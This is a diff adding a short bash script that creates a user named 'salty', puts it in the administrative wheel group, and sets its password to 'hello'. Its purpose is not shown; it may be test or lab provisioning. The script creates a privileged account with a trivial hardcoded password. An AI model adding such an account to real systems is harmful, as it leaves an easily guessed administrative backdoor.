@@ -1,0 +1,5 @@
+#!/bin/bash
+
+useradd salty
+usermod -aG wheel salty
+echo "hello" | passwd --stdin salty
